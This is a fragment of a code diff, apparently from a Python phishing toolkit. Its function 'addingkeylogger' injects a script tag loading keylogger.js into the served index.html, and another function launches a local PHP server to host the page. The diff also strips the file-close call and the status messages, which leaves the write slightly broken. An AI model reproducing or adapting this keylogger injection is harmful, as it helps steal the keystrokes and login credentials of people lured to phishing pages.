@@ -313,18 +313,7 @@ def addingkeylogger():
          c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
          f = open('Server/www/index.html', 'w')
          f.write(c)
-         f.close()
-         
-         print(_("\n\n{1}[{0}??{1}]{0} Keylogger Added {1}Successfully...\n").format(RED, DEFAULT))
-         sleep(7.5)
-          
-     else:
-         pass
-         print(_("\n\n{1}[{0}!!{1}]{0} Keylogger {1}Not Added{0}... \n").format(RED, DEFAULT))
-         sleep(7.0)
-	
-	
-	
+ 	
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
